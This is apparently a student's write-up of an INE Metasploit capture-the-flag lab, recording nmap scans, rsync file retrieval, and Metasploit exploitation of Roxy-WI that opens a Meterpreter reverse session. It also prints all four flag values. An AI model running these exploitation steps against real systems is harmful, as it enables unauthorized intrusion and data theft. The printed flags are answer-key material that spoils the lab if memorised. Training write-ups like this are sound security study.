# Lab Notes — The Metasploit Framework CTF 2

## Lab Information

**Lab:** Host & Network Penetration Testing: The Metasploit Framework CTF 2

**Platform:** INE

**Machine:** Kali Linux

**Targets:**
- `target1.ine.local`
- `target2.ine.local`

**Tools used:** Nmap, RSYNC, Metasploit Framework, Meterpreter

> **Publication notice:** These notes contain the captured flag values and a working lab solution. Verify INE's current publication rules before making the repository public.

---

## Flag 1 — RSYNC Enumeration

**Objective:** Enumerate the open port using Metasploit, and inspect the RSYNC banner closely; it might reveal something interesting.



### Step 1: Enumerate services

Command:

```bash
nmap -sV -sC target1.ine.local
```

Explanation:

- `nmap` — starts the network scanner.
- `-sV` — attempts to identify service versions.
- `-sC` — runs Nmap's default NSE scripts.
- `target1.ine.local` — specifies the target.

Relevant output:

```text
PORT    STATE SERVICE VERSION
873/tcp open  rsync   (protocol version 31)
```

**Finding:** TCP port 873 was open and running RSYNC.

**Note:** My recorded command for this step was Nmap, not a Metasploit port-scanning module.

### Step 2: Inspect the RSYNC module listing

Command:

```bash
rsync rsync://target1.ine.local
```

Output:

```text
backupwscohen   FLAG1_973d688be5324100a0aca39845e55909
```

Explanation:

- `rsync` — launches the RSYNC client.
- `rsync://` — specifies the RSYNC protocol.
- `target1.ine.local` — identifies the remote server.

**Finding:** The server disclosed the module `backupwscohen` and the first flag.

---

## Flag 2 — Explore the RSYNC Server's Files

**Objective:** The files on the RSYNC server hold valuable information. Explore the contents to find the flag.


### Step 1: List the module contents

Command:

```bash
rsync rsync://target1.ine.local/backupwscohen
```

Files discovered:

```text
TPSData.txt
office_staff.vhd
pii_data.xlsx
```

**Finding:** The RSYNC module exposed three files that could be retrieved.

### Step 2: Download the files

Commands:

```bash
rsync rsync://target1.ine.local/backupwscohen/TPSData.txt .
rsync rsync://target1.ine.local/backupwscohen/office_staff.vhd .
rsync rsync://target1.ine.local/backupwscohen/pii_data.xlsx .
```

Explanation:

- The RSYNC URL identifies the remote module and file.
- The final `.` means the current local working directory.
- The downloaded files were saved in the directory from which I ran the commands.

I verified the downloaded files with:

```bash
ls
```

My terminal prompt showed `~` while logged in as `root`, which represents `/root`. Therefore, the files were downloaded to `/root`, not the filesystem root `/`.

### Step 3: Inspect the downloaded file

Command:

```bash
cat pii_data.xlsx
```

Output:

```text
FLAG2_e54ef7f30b9043b1b21406c915c7efc2
```

**Finding:** The downloaded file contained readable text with the second flag.

---

## Flag 3 — Exploit Roxy-WI with Metasploit

**Objective:** Try exploiting the webapp to gain a shell using Metasploit on `target2.ine.local`.


### Step 1: Enumerate the second target

Command:

```bash
nmap -sV -sC -Pn target2.ine.local
```

Explanation:

- `-sV` — attempts to identify service versions.
- `-sC` — runs Nmap's default NSE scripts.
- `-Pn` — skips host discovery and treats the target as online.
- `target2.ine.local` — specifies the target.

Relevant output:

```text
PORT    STATE SERVICE  VERSION
80/tcp  open  http     Apache httpd 2.4.52 ((Ubuntu))
443/tcp open  ssl/http Apache httpd 2.4.52
|_http-title: Roxy-WI
```

**Finding:** The target hosted a Roxy-WI web application on HTTP and HTTPS.

### Step 2: Launch Metasploit and search for the application

Commands:

```bash
msfconsole -q
```

Inside Metasploit:

```text
search Roxy-WI
```

The search identified:

```text
exploit/linux/http/roxy_wi_exec
```

The module description indicated an unauthenticated command-injection remote code execution vulnerability affecting Roxy-WI versions prior to 6.1.1.0.

### Step 3: Select the module and review options

Commands:

```text
use 0
options
```

Important settings shown by the module:

- `RHOSTS` — remote target host.
- `RPORT` — target TCP port; default `443`.
- `SSL` — whether to use TLS; default `true`.
- `TARGETURI` — application path; default `/`.
- `LHOST` — callback address for the reverse connection.
- `LPORT` — local listener port; default `4444`.

### Step 4: Configure the target and callback address

Commands:

```text
set RHOSTS target2.ine.local
set LHOST 192.91.227.2
```

Explanation:

- `RHOSTS` identifies the target.
- `LHOST` identifies the Kali lab machine's callback address.

### Step 5: Execute the exploit

Command:

```text
exploit
```

Relevant output:

```text
[*] Checking if 192.91.227.4:443 is vulnerable!
[*] 192.91.227.4:443 is vulnerable!
[+] The target is vulnerable. The device responded to exploitation with a 200 OK and test command successfully executed.
[*] Exploiting...
[*] Meterpreter session 1 opened
```

**Finding:** Metasploit successfully opened a Meterpreter session.

### Step 6: Locate the flag

Inside Meterpreter:

```text
pwd
cd /
ls
cat flag.txt
```

The initial working directory was:

```text
/var/www/haproxy-wi/app
```

The root directory listing showed `flag.txt`. Reading it returned:

```text
FLAG3_00e781f518f2438582d1d78f8d27fb35
```

**Finding:** I retrieved the third flag from `/flag.txt`.

**Scope note:** These steps demonstrate obtaining a Meterpreter session and reading a file. My transcript does not document a separate privilege-escalation step.

---

## Flag 4 — Investigate Scheduled Tasks

**Objective:** Automated tasks can sometimes leave clues. Investigate scheduled jobs or running processes to uncover the hidden flag.


### Step 1: Navigate to the cron directory

Inside Meterpreter:

```text
cd etc
cd cron.d
ls
```

The directory contained:

```text
e2scrub_all
www-data-cron
```

**Finding:** `www-data-cron` was an interesting scheduled-task configuration file to inspect.

### Step 2: Inspect the file

My first attempt was:

```text
cd www-data-cron
```

Meterpreter returned a `NotADirectoryError` because the entry was a file, not a directory.

I then read it using:

```text
cat www-data-cron
```

Output:

```text
* * * * * www-data echo "FLAG4_5586df9f309546a69fa7431d5b988565"
```

Explanation:

- The five asterisks specify the cron schedule fields.
- `www-data` identifies the configured execution account.
- `echo` prints the quoted text.
- Five asterisks indicate a schedule of every minute.

**Finding:** The fourth flag was present directly in the scheduled-job command. Reading the configuration file was enough to retrieve it.

---

## Summary of Captured Flags

| Flag | Discovery method | Captured value |
|---|---|---|
| Flag 1 | RSYNC module listing | `FLAG1_973d688be5324100a0aca39845e55909` |
| Flag 2 | Downloaded RSYNC file | `FLAG2_e54ef7f30b9043b1b21406c915c7efc2` |
| Flag 3 | Roxy-WI exploitation with Metasploit | `FLAG3_00e781f518f2438582d1d78f8d27fb35` |
| Flag 4 | Scheduled-task file | `FLAG4_5586df9f309546a69fa7431d5b988565` |

## Key Takeaways

1. Service enumeration helps identify useful attack surfaces.
2. An improperly restricted RSYNC service can expose files and information.
3. Metasploit module options should be reviewed before exploitation.
4. A Meterpreter session can be used to investigate files within the authorized lab.
5. Scheduled-task configuration files can reveal commands and useful clues.
6. The `.` destination in an RSYNC command means the current working directory, not necessarily `/`.

## Conclusion

I completed all four objectives by enumerating RSYNC, retrieving exposed files, exploiting the Roxy-WI application with Metasploit, and inspecting the cron configuration directory.

This lab strengthened my understanding of service enumeration, file-sharing exposure, exploit configuration, Meterpreter navigation, and scheduled-task investigation.

## Responsible Use

These notes are for authorized cybersecurity training. Never scan, exploit, or access systems without explicit permission. Review INE's current rules before publishing lab solutions or flags publicly.
